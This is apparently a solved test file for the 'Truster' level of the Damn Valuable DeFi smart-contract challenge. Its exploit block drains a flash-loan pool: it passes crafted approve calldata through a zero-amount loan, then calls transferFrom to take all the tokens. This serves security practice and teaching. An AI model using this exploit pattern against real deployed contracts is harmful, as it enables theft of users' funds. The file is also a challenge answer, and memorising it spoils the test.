const { ethers } = require('hardhat');
const { expect } = require('chai');
var Web3 = require('web3');
var web3 = new Web3(Web3.givenProvider || 'ws://some.local-or-remote.node:8546');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');

        console.log(attacker.address)
        console.log(TOKENS_IN_POOL)
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        // Web3.modules
        // web3.eth.getAccounts(console.log);
        // let data = Web3.eth.abi.encodeFunctionCall({
        //     name: 'approve',
        //     type: 'function',
        //     inputs: [{
        //         type: 'address',
        //         name: 'receiver'
        //     },{
        //         type: 'uint256',
        //         name: 'amount'
        //     }]
        // }, [attacker, TOKENS_IN_POOL.toString()]);
        let data = "0x095ea7b300000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c800000000000000000000000000000000000000000000d3c21bcecceda1000000";
        
        await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, data );
        console.log("allowance :" ,await this.token.allowance(this.pool.address, attacker.address));
        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

